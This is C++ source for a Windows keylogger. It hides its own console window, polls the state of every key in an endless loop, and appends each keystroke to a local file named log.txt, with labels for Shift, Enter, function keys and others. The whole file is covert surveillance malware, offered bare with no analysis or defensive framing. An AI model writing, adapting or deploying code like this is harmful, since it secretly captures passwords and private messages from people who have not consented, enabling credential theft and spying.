#include <bits/stdc++.h>
#include <Windows.h>
using namespace std;
int Save ( int _key, char *file){
	cout<<_key<<endl;
	Sleep(10);
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file,"a+");
	if (_key==VK_SHIFT) fprintf(OUTPUT_FILE,"%s"," [SHIFT] ");
	else if (_key==VK_RETURN) fprintf(OUTPUT_FILE,"%s"," [ENTER] \n\n");
	else if (_key==VK_LBUTTON) fprintf(OUTPUT_FILE,"");
	else if (_key==VK_RBUTTON) fprintf(OUTPUT_FILE,"");
	else if (_key==VK_CANCEL) fprintf(OUTPUT_FILE,"%s"," [Control-break processing] ");
	else if (_key==VK_BACK) fprintf(OUTPUT_FILE," [BackSpace] ");// backspace
	else if (_key==VK_TAB) fprintf(OUTPUT_FILE,"%s"," [TAB] \n");
	else if (_key==VK_CAPITAL) fprintf(OUTPUT_FILE,"%s"," [Caplock] ");	
	else if (_key==VK_OEM_MINUS) fprintf(OUTPUT_FILE,"%s"," [NUM-] ");
	else if (_key==VK_MENU) fprintf(OUTPUT_FILE,"%s"," [ALT] ");
	else if (_key==VK_SPACE) fprintf(OUTPUT_FILE,"%s"," ");
	else if (_key==VK_CONTROL) fprintf(OUTPUT_FILE,"%s"," [CTRL] ");
	else if (_key==VK_ESCAPE) fprintf(OUTPUT_FILE,"%s","");
	else if (_key == 45 ) fprintf(OUTPUT_FILE, "%s", "[-]");	
 	else if (_key == VK_NUMPAD0) fprintf(OUTPUT_FILE, "%s", "[Num0]");
 	else if (_key == VK_NUMPAD1) fprintf(OUTPUT_FILE, "%s", "[Num1]");
 	else if (_key == VK_NUMPAD2) fprintf(OUTPUT_FILE, "%s", "[Num2]");
 	else if (_key == VK_NUMPAD3) fprintf(OUTPUT_FILE, "%s", "[Num3]");
 	else if (_key == VK_NUMPAD4) fprintf(OUTPUT_FILE, "%s", "[Num4]");
 	else if (_key == VK_NUMPAD5) fprintf(OUTPUT_FILE, "%s", "[Num5]");
 	else if (_key == VK_NUMPAD6) fprintf(OUTPUT_FILE, "%s", "[Num6]");
 	else if (_key == VK_NUMPAD7) fprintf(OUTPUT_FILE, "%s", "[Num7]");
 	else if (_key == VK_NUMPAD8) fprintf(OUTPUT_FILE, "%s", "[Num8]");
 	else if (_key == VK_NUMPAD9) fprintf(OUTPUT_FILE, "%s", "[Num9]");
 	else if (_key == VK_F1) fprintf(OUTPUT_FILE, "%s", "[F1]");
 	else if (_key == VK_F2) fprintf(OUTPUT_FILE, "%s", "[F2]");
 	else if (_key == VK_F3) fprintf(OUTPUT_FILE, "%s", "[F3]");
 	else if (_key == VK_F4) fprintf(OUTPUT_FILE, "%s", "[F4]");
 	else if (_key == VK_F5) fprintf(OUTPUT_FILE, "%s", "[F5]");
 	else if (_key == VK_F6) fprintf(OUTPUT_FILE, "%s", "[F6]");
 	else if (_key == VK_F7) fprintf(OUTPUT_FILE, "%s", "[F7]");
 	else if (_key == VK_F8) fprintf(OUTPUT_FILE, "%s", "[F8]");
	else if (_key == VK_F9) fprintf(OUTPUT_FILE, "%s", "[F9]");
 	else if (_key == VK_F10) fprintf(OUTPUT_FILE, "%s", "[F10]");
 	else if (_key == VK_F11) fprintf(OUTPUT_FILE, "%s", "[F11]");
 	else if (_key == VK_F12) fprintf(OUTPUT_FILE, "%s", "[F12]");	
	else fprintf(OUTPUT_FILE,"%s",&_key);
	fclose(OUTPUT_FILE);
	return 0;
}
int main (){
//	FreeConsole();
	HWND hWnd = GetConsoleWindow();// hide console
	ShowWindow(hWnd, SW_HIDE);// hide console
char i;
remove( "log.txt" );
while (true){
	Sleep(10);
	for (i=8;i<255;i++){
		if ( GetAsyncKeyState(i) == -32767 ){
			Save(i,"log.txt");
		}
	}
}
return 0;
}

